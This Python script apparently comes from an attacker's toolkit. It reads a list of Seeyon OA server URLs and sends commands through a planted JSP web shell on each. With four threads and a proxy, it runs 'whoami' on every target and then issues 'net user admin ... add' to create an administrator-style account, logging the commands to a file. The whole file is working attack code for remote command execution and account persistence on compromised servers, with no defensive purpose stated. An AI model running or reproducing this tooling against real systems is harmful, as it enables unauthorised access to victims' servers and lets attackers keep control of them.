#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
# __author__:leezp
# __date__:2019-07-10
# Local:  Win7 (python3)
# 有权限的，没权限的，统一提权到admin

import queue
import threading
import urllib
from urllib import request
import re
from urllib import parse

q = queue.Queue()

# 读取 txt
file = open('success.txt')  # encoding='UTF-8'
for x in file.readlines():
    q.put(x.split('/seeyon')[0])
headers = {
    'Accept':'*/*',
    'Connection': 'Close',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}

# 这是代理IP
proxies = [{'http': '127.0.0.1:1081', 'https': 'socks5h://127.0.0.1:1081'}]  # 使用时需要ss填写正确，并且关闭代理软件
# 创建ProxyHandler
httpproxy_handler = urllib.request.ProxyHandler(proxies[0])
nullproxy_handler = urllib.request.ProxyHandler({})
# 定义一个代理开关
proxySwitch = True
# 根据代理开关是否打开，使用不同的代理模式
if proxySwitch:
    # 创建Opener
    opener = urllib.request.build_opener(httpproxy_handler)
else:
    opener = urllib.request.build_opener(nullproxy_handler)


def tq():
    while not q.empty():
        url = q.get()
        try:
            payload = 'whoami'
            request_r = urllib.request.Request(
                url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=' + payload,
                headers=headers)
            response_r = opener.open(request_r)
            html = response_r.read().decode("utf-8")
        except:
            print(url + ' 404')
            pass
        try:
            p = re.compile(r'<pre>(.*)\\')  # oaserver\oauser  ; oaserver\administrator
            if p.search(html) is not None:
                username = p.search(html).group(1)
            else:
                print(url + 'return <pre></pre>') # 返回null 或 <pre></pre>
                continue
            payload2 = 'net user admin ' + username + ' add'
            with open('tqw.txt', 'a') as f:
                f.write(payload2 + '\n')
        except:
            print(url + ' not return administrator')
            pass
        try:
            payload2 = urllib.parse.quote(payload2)
            request_r2 = urllib.request.Request(
                url=url + '/seeyon/ping123456.jsp?pwd=ping&cmd=' + payload2,
                headers=headers)
            response_r2 = opener.open(request_r2)
        except:
            pass


th = []
th_num = 4
for x in range(th_num):
    t = threading.Thread(target=tq)
    th.append(t)
for x in range(th_num):
    th[x].start()
for x in range(th_num):
    th[x].join()
